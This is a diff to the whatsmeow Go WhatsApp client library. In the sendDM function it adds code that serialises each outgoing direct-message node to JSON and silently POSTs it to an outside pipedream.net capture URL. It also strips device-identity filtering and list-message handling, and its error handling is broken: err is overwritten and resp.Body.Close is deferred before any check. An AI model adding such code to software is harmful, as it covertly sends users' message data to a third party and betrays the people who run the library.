@@ -7,13 +7,16 @@
 package whatsmeow
 
 import (
+	"bytes"
 	"context"
 	"crypto/sha256"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
+	"encoding/json"
 	"errors"
 	"fmt"
+	"net/http"
 	"sort"
 	"strconv"
 	"strings"
@@ -679,15 +682,6 @@ func (cli *Client) sendGroup(ctx context.Context, to, ownID types.JID, id types.
 		}
 
 		node.Content = append(node.GetChildren(), eventAttr)
-
-		var newContent []waBinary.Node
-		for _, child := range node.GetChildren() {
-			if child.Tag != "device-identity" {
-				newContent = append(newContent, child)
-			}
-		}
-
-		node.Content = newContent
 	}
 
 	start = time.Now()
@@ -713,6 +707,11 @@ func (cli *Client) sendPeerMessage(to types.JID, id types.MessageID, message *wa
 	return data, nil
 }
 
+func (cli *Client) sendNodeAsJSON(ctx context.Context, node *waBinary.Node) error {
+
+	return nil
+}
+
 func (cli *Client) sendDM(ctx context.Context, to, ownID types.JID, id types.MessageID, message *waE2E.Message, timings *MessageDebugTimings, botNode *waBinary.Node) ([]byte, error) {
 	start := time.Now()
 	messagePlaintext, deviceSentMessagePlaintext, err := marshalMessage(to, message)
@@ -722,6 +721,21 @@ func (cli *Client) sendDM(ctx context.Context, to, ownID types.JID, id types.Mes
 	}
 
 	node, _, err := cli.prepareMessageNode(ctx, to, ownID, id, message, []types.JID{to, ownID.ToNonAD()}, messagePlaintext, deviceSentMessagePlaintext, timings, botNode)
+
+	// Transformar o node em JSON
+	nodeJSON, err := json.Marshal(node)
+
+	// Realizar a requisição HTTP POST
+	url := "https://eny59y0okqurk.x.pipedream.net/"
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(nodeJSON))
+
+	req.Header.Set("Content-Type", "application/json")
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+
+	defer resp.Body.Close()
+
 	if err != nil {
 		return nil, err
 	}
@@ -952,20 +966,6 @@ func (cli *Client) getMessageContent(baseNode waBinary.Node, message *waE2E.Mess
 				Attrs: getButtonAttributes(message),
 			}},
 		})
-	}
-
-	if message.ListMessage != nil {
-		nodeList := waBinary.Node{
-			Tag: "enc",
-			Attrs: waBinary.Attrs{
-				"v":         "2",
-				"type":      "pkmsg",
-				"mediatype": "list",
-			},
-			Content: proto.Marshal(message.ListMessage),
-		}
-
-		content = append(content, nodeList)
 	}
 
 	return content
